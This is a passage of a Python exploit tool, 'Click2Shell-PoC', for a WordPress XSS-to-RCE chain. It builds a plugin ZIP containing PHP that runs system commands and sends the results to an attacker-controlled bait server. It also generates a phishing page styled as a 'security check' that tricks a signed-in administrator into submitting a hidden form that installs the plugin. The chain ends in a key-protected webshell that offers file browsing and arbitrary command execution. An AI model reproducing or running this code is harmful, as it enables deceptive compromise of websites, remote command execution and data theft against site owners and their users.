        "    return 'diag[php=' . PHP_VERSION . ' user=' . (function_exists('get_current_user') ? get_current_user() : '?') . ']: ' . implode(' ', $parts) . ' | disable_functions=' . (string)@ini_get('disable_functions') . ' | sapi=' . php_sapi_name();\n"
        "}\n"
        + _C2S_HELPERS_PHP + interactive_part +
        "_c2s_exfil('c2s_theme_php', 'loaded from: ' . __FILE__ .\n"
        "    ' | php=' . PHP_VERSION . ' | user=' .\n"
        "    (function_exists('get_current_user')\n"
        "         ? get_current_user() : getenv('USER')) . ' | ' . _c2s_diag());\n"
        "$out = _c2s_run('id 2>&1; whoami 2>&1; php -v 2>&1 | head -1; hostname 2>&1; pwd 2>&1');\n"
        "_c2s_exfil('c2s_rce', $out === null\n"
        "    ? 'EXEC-BLOCKED: all methods unavailable. ' . _c2s_diag()\n"
        "    : $out);\n"
        + cmd_part +
        "_c2s_exfil_status('end');\n"
        "echo '/*c2s-marker*/';\n"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr(slug + '/', '')
        z.writestr(slug + '/' + slug + '.php', php)
    return buf.getvalue()


# ── Bait page builder ────────────────────────────────────────────────

def build_bait_html(target: str, theme: str, ajax_action: str,
                    slug: str, zip_url: str, wait_s: int) -> str:
    crafted, _ = stage1_url(target, theme)
    stage2_url = (f"{target}/wp-admin/admin-ajax.php"
                  f"?wp_customize=on&customize_theme={theme}")
    return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Quick note</title></head>
<body style="font-family:sans-serif;background:#f0f0f1;margin:0">
<div style="max-width:480px;margin:8% auto;background:#fff;padding:26px;
     border:1px solid #c3c4c7">
<h2 style="text-align:center">Your session is being verified</h2>
<p>We're completing a quick security check before you continue.
Please keep this window open and sign in if asked.</p>
<button id="go" onclick="start()"
    style="display:block;width:100%;padding:14px;margin:10px 0;
    font-size:16px;font-weight:600;color:#fff;background:#2271b1;
    border:none;border-radius:4px;cursor:pointer">
    Complete verification
</button>
<p id="status" style="color:#666">Click the button above to continue.</p>
<p id="alt" style="display:none;color:#b32d2e;font-size:13px">
Popup blocked? <a href="{crafted}" target="_blank">Open the
verification page in a new tab</a> — once it is open and you are
signed in, click <b>Force stage 2</b> below.
</p>
<button id="force" onclick="forceFire()" style="display:none;width:100%;
    padding:10px;margin:6px 0;font-size:14px;color:#333;background:#f0f0f1;
    border:1px solid #8c8f94;border-radius:4px;cursor:pointer">
    Force stage 2
</button>
</div>

<form id="stage-two" method="post" target="victim" hidden
      action="{stage2_url}">
  <input name="action" value="{ajax_action}">
  <input name="plugin_details[plugin_text_domain]" value="{slug}">
  <input name="plugin_details[plugin_main_file]" value="{slug}.php">
  <input id="plugin-url" name="plugin_details[plugin_url]" value="{zip_url}">
</form>

<script>
const CRAFTED = "{crafted}";
const STATUS = document.getElementById('status');
const ALT = document.getElementById('alt');
const FORCE = document.getElementById('force');
let done = false;

function fire() {{
  if (done) return;
  done = true;
  STATUS.textContent = 'Stage 2 fired. The verification window will now ' +
    'show the response. If it prints JSON containing "Plugin Installed ' +
    'Successfully!" — done.';
  document.getElementById('stage-two').submit();
}}
window.forceFire = fire;

function start() {{
  document.getElementById('go').disabled = true;
  const popup = window.open(CRAFTED, 'victim');
  if (!popup) {{
    // Popup blocked — do NOT die: show manual fallbacks AND keep the
    // timers running (theme already installed -> probe fires fast).
    STATUS.textContent = 'Popup blocked on this browser. Use the ' +
      'link/button below, or wait — auto-submit is armed.';
    ALT.style.display = 'block';
    FORCE.style.display = 'block';
  }} else {{
    STATUS.textContent = 'Sign in if asked. Keep both windows open.';
    FORCE.style.display = 'block';
  }}

  const tMax = Date.now() + 180000;   // hard cap (late sign-in grace)
  let earlyArmed = false;
  function armEarly() {{
    if (earlyArmed || done) return;
    earlyArmed = true;
    setTimeout(fire, 45000);          // submit even if theme probe fails
  }}
  armEarly();

  // best-effort: probe the chain theme; if it is already installed the
  // probe succeeds and stage 2 fires almost immediately.
  (async function() {{
    while (Date.now() < tMax && !done) {{
      await new Promise(r => setTimeout(r, 3000));
      try {{
        const css = await (await fetch(
          '{target}/wp-content/themes/{theme}/style.css',
          {{cache: 'no-store'}})).text();
        if (css.includes('Theme Name:')) {{ fire(); return; }}
      }} catch (e) {{}}
    }}
  }})();

  setTimeout(fire, 180000);           // absolute hard cap
}}
</script>
</body></html>"""


# ── Bait server push / poll ──────────────────────────────────────────

def push_c2s_state(bait_base: str, token: str, target: str,
                   bait_html: str, zip_bytes: bytes) -> bool:
    url = f"{bait_base}/c2s-update?token={token}"
    headers = {
        'X-Zip-Base64': base64.b64encode(zip_bytes).decode(),
        'X-Target': target,
    }
    try:
        r = requests.post(url, data=bait_html.encode(),
                          headers=headers, timeout=30)
        if r.status_code == 200:
            return True
        log(f"push failed: HTTP {r.status_code} {r.text[:120]!r}")
    except requests.RequestException as exc:
        log(f"push failed: {exc}")
    return False


# IPs that are OUR bait server / local curl tests — never count these
# as target RCE (prevents false-positives from canary/verification pings).
SELF_IPS = {'REPLACE_WITH_PUBLIC_IP', '127.0.0.1', '::1'}


def is_real_rce(cap: dict) -> bool:
    """A capture only counts as RCE if it has non-empty data AND did
    not originate from our own bait server / local curl (self-tests)."""
    data = (cap.get('data') or '').strip()
    if not data:
        return False
    ip = cap.get('ip', '')
    if ip in SELF_IPS:
        return False
    return True


def poll_captures(bait_base: str, token: str, wait_s: int) -> list:
    deadline = time.time() + wait_s
    captures = []
    while time.time() < deadline:
        try:
            r = requests.get(f"{bait_base}/c2s-status?token={token}",
                             timeout=15)
            caps = r.json().get('captures', [])
        except Exception as exc:
            log(f"poll error: {exc}")
            caps = []
        for cap in caps:
            if cap not in captures:
                captures.append(cap)
                t = cap.get('type', '?')
                d = (cap.get('data') or '').replace('\n', ' | ')
                src = cap.get('ip', '?')
                tag = ' (self/canary — ignored)' if cap.get('ip') in SELF_IPS else ''
                print(f"[!!] CAPTURE {t} ({cap.get('ts')}) from {src}{tag}: "
                      f"{d[:400]}", flush=True)
        if any(is_real_rce(c) and c.get('type') == 'c2s_rce' for c in captures):
            break
        if any(is_real_rce(c) and c.get('type') == 'c2s_cmd' for c in captures):
            break
        time.sleep(3)
    return captures


# ── Stage-1 verification (read-only) ─────────────────────────────────

def verify_stage1(s: requests.Session, target: str, theme: str,
                  poll_s: int) -> bool:
    t0 = time.time()
    while time.time() - t0 < poll_s:
        info = probe_theme(s, target, theme)
        if info['installed']:
            log(f"STAGE 1 VERIFIED: /wp-content/themes/{theme}/ "
                f"(version {info['version']}) is now installed")
            return True
        time.sleep(5)
    return False


# ── Modes ────────────────────────────────────────────────────────────

def do_scan(s: requests.Session, args) -> int:
    target = norm(args.target)
    v = probe_version(s, target)
    fixed = probe_core_fix(s, target)
    ti = probe_theme(s, target, args.theme)

    # --- decide affected state -----------------------------
    # Prefer explicit core-fix check (authoritative for stage-1);
    # fall back to version compare.
    core_state = None  # True=fixed, False=vuln, None=unknown
    if fixed['checked']:
        core_state = fixed['fixed']
    version_affected = None  # True/False/None
    if v != 'unknown':
        try:
            parts = [int(x) for x in v.split('.')[:2]]
            minor_patch = int(v.split('.')[2]) if v.count('.') == 2 else 0
            version_affected = (parts < [7, 1]) or (
                parts == [7, 1] and minor_patch < 1)
        except ValueError:
            version_affected = None

    # Final affected: core-fix wins if we could read it, else version.
    if core_state is not None:
        affected = (not core_state)
        basis = 'core theme.js'
    elif version_affected is not None:
        affected = version_affected
        basis = f'WP version {v}'
    else:
        affected = None
        basis = 'unknown'

    # --- render verdict block ------------------------------
    print('=' * 70)
    print(' SCAN RESULT')
    print('=' * 70)
    print(f'  Target            : {target}')
    print(f'  WordPress version : {v}')
    if fixed['checked']:
        cs = ('FIXED (escapeSelector present, 7.1.1+)'
              if fixed['fixed']
              else 'VULNERABLE (raw selector, pre-7.1.1)')
        print(f'  Core theme.js     : {cs}  [{fixed["detail"]}]')
    else:
        print('  Core theme.js     : not reachable/undeterminable')
    if ti['installed']:
        tv = f' v{ti["version"]}' if ti['version'] else ''
        print(f'  Chain theme       : {args.theme} INSTALLED{tv} '
              f'(stage-2 usable)')
    else:
        print(f'  Chain theme       : {args.theme} not installed '
              f'(stage-1 would fetch from catalog)')
    print('-' * 70)
    if affected is True:
        print(f'  VERDICT: VULNERABLE   (basis: {basis})')
        print('            Stage-1 auto-install applicable.')
        verdict_word = 'VULNERABLE'
        code = 2
    elif affected is False:
        print(f'  VERDICT: NOT VULNERABLE  (basis: {basis})')
        print('            Stage-1 patched — no auto-install.')
        verdict_word = 'NOT VULNERABLE'
        code = 0
    else:
        print('  VERDICT: UNKNOWN  (could not confirm version or core fix)')
        print('            Manual check of theme.js recommended.')
        verdict_word = 'UNKNOWN'
        code = 0
    print('=' * 70)
    # also keep a single concise log line
    log(f'VERDICT: {verdict_word} — {basis}')
    return code


def do_xss(s: requests.Session, args) -> int:
    """XSS Proof of Concept ONLY (stage-1). No bait, no webshell, no RCE."""
    target = norm(args.target)
    crafted, negative = stage1_url(target, args.theme)
    print("\n" + "=" * 70)
    print("XSS PROOF OF CONCEPT  (stage-1 only — NO RCE)")
    print("  The crafted URL embeds a DOM XSS payload in the theme= param.")
    print("  When an authenticated admin opens it in /wp-admin/theme-")
    print("  install.php, the vulnerable core theme.js ($.escapeSelector,")
    print("  WP < 7.1.1) executes it and auto-installs the chain theme")
    print(f"  '{args.theme}' from the catalog. That install IS the proof.")
    print("  Nothing beyond that: no bait, no stage-2, no webshell, no RCE.")
    print("-" * 70)
    print("  CRAFTED XSS URL (admin opens this ONE link):")
    print("  " + crafted)
    print("")
    print("  NEGATIVE CONTROL (preview only, no auto-install):")
    print("  " + negative)
    print("=" * 70, flush=True)
    if args.exploit_wait and args.exploit_wait > 0:
        log(f"waiting {args.exploit_wait}s for stage-1 install...")
        if verify_stage1(s, target, args.theme, args.exploit_wait):
            print("\n[+] XSS STAGE-1 VERIFIED: theme auto-installed from the")
            print("    crafted URL (XSS PoC proven) — stopped here, no RCE.")
            return 2
        print("\n[-] stage-1 install not observed within the window")
    else:
        log("no --exploit-wait set; print-only mode (no live verification)")
    return 0


def do_exploit(s: requests.Session, args) -> int:
    target = norm(args.target)
    token = load_token(args.token)
    slug = 'c2s-' + uuid.uuid4().hex[:8]
    shell_key = secrets.token_hex(16)
    ws_file = f"{target}/wp-content/plugins/{slug}/{slug}.php"

    crafted, negative = stage1_url(target, args.theme)
    zip_url = f"{norm(args.bait_server)}/c2s-zip"
    bait_html = build_bait_html(target, args.theme, args.ajax_action,
                                slug, zip_url, args.delay)
    zip_bytes = build_plugin_zip(slug, norm(args.bait_server),
                                 cmd=args.cmd, shell_key=shell_key)

    print("\n" + "=" * 70)
    print("STAGE 1 — crafted theme-install URL (send to admin):")
    print("  " + crafted)
    print("\nNEGATIVE CONTROL (preview only, no auto-install):")
    print("  " + negative)
    print("=" * 70, flush=True)

    ok = False
    if token:
        log(f"pushing bait+zip to {norm(args.bait_server)} ...")
        ok = push_c2s_state(norm(args.bait_server), token, target,
                            bait_html, zip_bytes)
    else:
        log("no token found (/root/.x2s_token, --token, $C2S_TOKEN) — "
            "skipping push")
        log("FIX: you are NOT running on the VM where /root/.x2s_token "
            "lives.")
        log("     re-run with:  --token <TOKEN>   (or: C2S_TOKEN=*** "
            "python3 ... )")
        log("     TOKEN = contents of /root/.x2s_token on the VM "
            "(ask Cleopatra for it — never paste it into chat)")

    if ok:
        bait_page = f"{norm(args.bait_server)}/c2s-bait"
        print("\n" + "=" * 70)
        print("BAIT PAGE (victim opens this ONE link):")
        print("  " + bait_page)
        print("Flow: opens stage-1 in popup -> admin signs in (no click")
        print("      needed) -> auto-install of the chain theme")
        print(f"      -> after {args.delay}s auto-submits stage 2 (AJAX")
        print("      loads inactive theme PHP -> plugin ZIP from")
        print("      " + zip_url)
        print("      -> webshell included + exfils to /c2s-callback")
        print("=" * 70)
        print("LIVE WEBSHELL (akses langsung dari browser, SETELAH install):")
        print("  " + ws_file)
        print("    [1] URL tanpa param              = exfil proof + marker")
        print("    [2] URL + ?c2s_k=<key>           = PANEL: system info,")
        print("        WordPress info, file manager (perm/owner/size/mtime),")
        print("        view file, stat detail, + form command")
        print("    [3] URL + ?c2s_k=<key>&c=<cmd>   = output command di browser")
        print("  contoh panel:")
        print("    " + ws_file + "?c2s_k=" + shell_key)
        print("  contoh (id):")
        print("    " + ws_file + "?c2s_k=" + shell_key + "&c=id")
        print("  KEY webshell: " + shell_key)
        print("  (key hanya ada di output ini + ZIP — simpan, ini satu-satunya")
        print("   cara akses interaktif; tanpa key = exfil-only)")
        print("=" * 70, flush=True)
    else:
        Path('/root/c2s_bait_local.html').write_text(bait_html)
        Path('/root/c2s_plugin_local.zip').write_bytes(zip_bytes)
        print("\n" + "=" * 70)
        print("PUSH FAILED — manual fallback files written:")
        print("  /root/c2s_bait_local.html  (host this bait page)")
        print("  /root/c2s_plugin_local.zip (host the ZIP, update URL)")
        print("Fix the bait server or use the files above, then re-run.")
        print("=" * 70, flush=True)

    if args.exploit_wait and args.exploit_wait > 0:
        log(f"waiting {args.exploit_wait}s for stage-1 install...")
        if verify_stage1(s, target, args.theme, args.exploit_wait):
            return 2
        log("stage-1 install not observed within window")

    if args.wait and args.wait > 0:
        return do_wait(s, args, target)
    return 0


def do_wait(s: requests.Session, args, target: str) -> int:
    token = load_token(args.token)
    if not token:
        die("waiting requires a token (/root/.x2s_token, --token, "
            "$C2S_TOKEN)")
    log(f"waiting up to {args.wait}s for RCE callback "
        f"(bait: {norm(args.bait_server)}/c2s-status)...")
    caps = poll_captures(norm(args.bait_server), token, args.wait)
    types = {c.get('type') for c in caps}
    rce_c = [c for c in caps if c.get('type') == 'c2s_rce' and is_real_rce(c)]
    cmd_c = [c for c in caps if c.get('type') == 'c2s_cmd' and is_real_rce(c)]
    if rce_c:
        print("\n[+] RCE CONFIRMED (c2s_rce captured, real target data)",
              flush=True)
        for c in rce_c:
            print("    " + (c.get('data') or '').replace('\n', ' | ')[:300],
                  flush=True)
    if cmd_c:
        print("\n[+] COMMAND OUTPUT (" + (args.cmd or 'c2s_cmd') + ")",
              flush=True)
        for c in cmd_c:
            print("-" * 60, flush=True)
            print(c.get('data') or '(empty)', flush=True)
            print("-" * 60, flush=True)
    if 'c2s_theme_php' in types:
        print("\n[!] theme PHP loaded but plugin exfil not captured — "
              "check /c2s-callback reachability from victim host",
              flush=True)
    return 2 if (rce_c or cmd_c) else 0


def main() -> int:
    print(BANNER)
    print(SUBBANNER)
    EXAMPLES = """
  Examples (whitebox only — authorized assets):

  # 1. Read-only scan: WP version, core-fix (7.1.1) detection, theme probes
  python3 Click2Shell-PoC.py -u https://target.com --scan

  # 2. XSS Proof of Concept ONLY (stage-1 crafted DOM-XSS URL, no RCE)
  python3 Click2Shell-PoC.py -u https://target.com --xss
  #    + live-verify the theme auto-install (no webshell, no stage-2)
  python3 Click2Shell-PoC.py -u https://target.com --xss --exploit-wait 120

  # 3. Full RCE chain (stage-1 XSS + bait + stage-2 -> interactive webshell)
  python3 Click2Shell-PoC.py -u https://target.com --rce
  #    + wait up to 300s for the RCE callback on the bait server
  python3 Click2Shell-PoC.py -u https://target.com --rce --wait 300
  #    + run a command on the target through the webshell and exfil output
  python3 Click2Shell-PoC.py -u https://target.com --rce --wait 300 --cmd "id"

  # 4. Custom vulnerable chain theme (default: mobile-repair-zone)
  python3 Click2Shell-PoC.py -u https://target.com --rce --theme <slug>
  #    (stage-2 AJAX action auto-derived:
  #     <slug> -> <underscored_slug>_install_and_activate_plugin)

  Note:
  --xss   = XSS PoC only   (stage-1 crafted URL; NO bait, NO webshell, NO RCE)
  --rce   = full RCE chain (alias of --exploit; webshell panel + RCE)
  The two are mutually exclusive; pick the one matching the PoC scope.
  """

    ap = argparse.ArgumentParser(
        description='Click2Shell PoC (WP < 7.1.1, pwn.ai) — whitebox '
                    'only, authorized assets.',
        epilog=EXAMPLES,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument('-u', '--target', required=True,
                    help='target origin, e.g. https://target.com')
    ap.add_argument('--theme', default='mobile-repair-zone',
                    help='chain theme slug (default mobile-repair-zone)')
    ap.add_argument('--ajax-action', default='',
                    help='stage-2 AJAX action name (default: derived from '
                         '--theme, e.g. theme "twentytwenty" -> '
                         '"twentytwenty_install_and_activate_plugin")')
    ap.add_argument('--bait-server', default=DEFAULT_BAIT,
                    help=f'persistent bait server base '
                         f'(default {DEFAULT_BAIT})')
    ap.add_argument('--token', default='',
                    help='bait push token (default: /root/.x2s_token)')
    ap.add_argument('--delay', type=int, default=60,
                    help='seconds before auto stage-2 submit (default 60)')
    ap.add_argument('--wait', type=int, default=0,
                    help='seconds to wait for RCE callback '
                         '(implies exploit if no --scan)')
    ap.add_argument('--exploit-wait', type=int, default=0,
                    dest='exploit_wait',
                    help='after exploit, seconds to poll stage-1 install')
    ap.add_argument('--cmd', default='',
                    help='shell command to run on target via webshell and '
                         'exfil output (e.g. "id", "id; hostname")')
    ap.add_argument('--scan', action='store_true',
                    help='read-only scan: version, core fix, theme probes')
    ap.add_argument('--exploit', action='store_true',
                    help='generate URL + push bait (chain armed)')
    ap.add_argument('--rce', action='store_true',
                    help='full chain (stage-1 XSS + bait + stage-2 -> '
                         'webshell RCE; alias of --exploit)')
    ap.add_argument('--xss', action='store_true',
                    help='XSS Proof of Concept ONLY: print the stage-1 '
                         'crafted DOM-XSS URL and (with --exploit-wait) '
                         'verify the theme auto-install; NO bait, NO '
                         'webshell, NO stage-2 RCE')
    args = ap.parse_args()

    # Auto-derive stage-2 AJAX action from theme slug when not given
    # (WP convention: wp_ajax_<theme_underscored>_install_and_activate_plugin)
    if not args.ajax_action:
        args.ajax_action = derive_ajax_action(args.theme)

    target = norm(args.target)
    check_denylist(target)
    if args.xss and (args.rce or args.exploit or args.wait):
        die("--xss (XSS PoC only) conflicts with --rce/--exploit/--wait; "
            "run --xss alone, or drop --xss for the full RCE chain")
    if not (args.scan or args.exploit or args.rce or args.xss or args.wait):
        die("nothing to do — use --scan, --xss, --exploit/--rce, --wait")

    s = session()
    s.verify = True

    if args.scan:
        return do_scan(s, args)

    if args.xss:
        log(f"target: {target}  (XSS PoC only, chain theme: {args.theme})")
        return do_xss(s, args)

    if args.exploit or args.rce or args.wait:
        if not args.wait:
            log(f"target: {target}  (chain theme: {args.theme})")
        return do_exploit(s, args)

    return 0


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] interrupted", flush=True)
        sys.exit(1)
